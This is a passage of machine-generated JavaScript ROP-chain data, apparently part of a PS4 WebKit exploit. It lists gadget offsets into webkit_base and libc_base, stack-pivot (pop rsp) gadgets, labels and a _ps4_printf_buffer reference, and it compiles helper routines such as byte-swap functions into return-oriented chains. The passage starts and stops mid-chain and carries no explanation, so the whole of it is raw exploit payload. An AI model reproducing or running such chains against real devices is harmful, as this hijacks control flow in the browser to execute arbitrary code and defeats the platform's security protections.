//L2440:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+164168, //L2442
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+164152, //L2441
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2441:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2442:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+164304, //L2445
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+164288, //L2444
webkit_base+7438103, //mov [rsi], rax
libc_base+206806, //pop rdi
//L2443:
ropchain+128, //_ps4_printf_buffer
libc_base+792472 //pop rcx
]);
//L2444:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2445:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+164448, //L2448
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+164416, //L2446
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+164432, //L2447
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2446:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2447:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2448:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+164536, //L2450
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L2449:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2450:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+164600, //L2452
webkit_base+7438103, //mov [rsi], rax
libc_base+788575, //pop rax
//L2451:
ropchain+128, //_ps4_printf_buffer
libc_base+792472 //pop rcx
]);
//L2452:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+793877, //pop rsi
ropchain+164656, //L2453
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2453:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+164736, //L2455
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2455:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+164792, //L2458
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2458:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+865136, //mov [rax], cl
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+164920, //L2460
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+164904, //L2459
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2459:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2460:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+165016, //L2461
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+165032, //L2462
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2461:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2462:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+165144, //L2463
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+165128, //L2464
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2464:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2463:
db([0, 0]); // 0x0
//L2405:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+792472, //pop rcx
write_addr,
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+166472, //L2465
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L2465:
db([0, 0]); // 0x0
//___bswap64_var:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+166544, //L2466
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L2466:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+166640, //L2468
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+166672, //L2471
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
webkit_base+432898 //pop r8
]);
//L2468:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2470:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L2471:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+166760, //L2472
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+166776, //L2474
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2472:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2474:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+166896, //L2476
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+166912, //L2477
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+166880, //L2475
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2475:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2476:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2477:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+167008, //L2478
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+167024, //L2479
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2478:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2479:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+167136, //L2480
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+167120, //L2481
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2481:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2480:
db([0, 0]); // 0x0
set_gadgets([
libc_base+793877, //pop rsi
ropchain+167224, //L2483
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+167208, //L2482
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2482:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2483:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+167320, //L2484
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+167336, //L2485
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2484:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2485:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+167448, //L2486
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+167432, //L2487
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2487:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2486:
db([0, 0]); // 0x0
//___bswap32_var:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+167520, //L2488
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L2488:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+167616, //L2490
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+167648, //L2493
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
webkit_base+432898 //pop r8
]);
//L2490:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2492:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L2493:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+167736, //L2494
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+167752, //L2496
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2494:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2496:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+167904, //L2498
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+167936, //L2500
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+167888, //L2497
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+167920, //L2499
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2497:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2498:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2499:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2500:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+168096, //L2504
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+168048, //L2501
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+168064, //L2502
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2501:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2502:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2503:
db([32, 0]); // 0x20
set_gadget(libc_base+788575,); //pop rax
//L2504:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+168224, //L2506
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+168240, //L2507
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+168208, //L2505
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2505:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2506:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2507:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+168336, //L2508
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+168352, //L2509
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2508:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2509:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+168464, //L2510
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+168448, //L2511
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2511:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2510:
db([0, 0]); // 0x0
set_gadgets([
libc_base+793877, //pop rsi
ropchain+168552, //L2513
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+168536, //L2512
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2512:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2513:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+168648, //L2514
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+168664, //L2515
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2514:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2515:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+168776, //L2516
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+168760, //L2517
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2517:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2516:
db([0, 0]); // 0x0
//___bswap16_var:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+168848, //L2518
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L2518:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+168944, //L2520
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+168976, //L2523
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
webkit_base+432898 //pop r8
]);
//L2520:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2522:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L2523:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+169064, //L2524
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+169080, //L2526
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2524:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2526:
db([0, 0]); // 0x0
set_gadgets([
libc_base+270800, //mov ax, [rdi]
libc_base+793877, //pop rsi
ropchain+169240, //L2530
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+169192, //L2527
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+169208, //L2528
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2527:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2528:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2529:
db([16, 0]); // 0x10
set_gadget(libc_base+788575,); //pop rax
//L2530:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+169296, //L2532
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L2532:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+169400, //L2533
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+169432, //L2535
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+169416, //L2534
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2533:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2534:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2535:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+169592, //L2539
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+169544, //L2536
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+169560, //L2537
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2536:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2537:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2538:
db([48, 0]); // 0x30
set_gadget(libc_base+788575,); //pop rax
//L2539:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+169696, //L2541
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+169680, //L2540
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2540:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2541:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L2542:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L2543:
db([8, 0]); // 0x8
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+169904, //L2546
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+169872, //L2544
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2544:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2545:
db([48, 0]); // 0x30
set_gadget(libc_base+788575,); //pop rax
//L2546:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+170008, //L2548
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+169992, //L2547
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2547:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2548:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+170104, //L2551
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2550:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L2551:
db([0, 0]); // 0x0
set_gadgets([
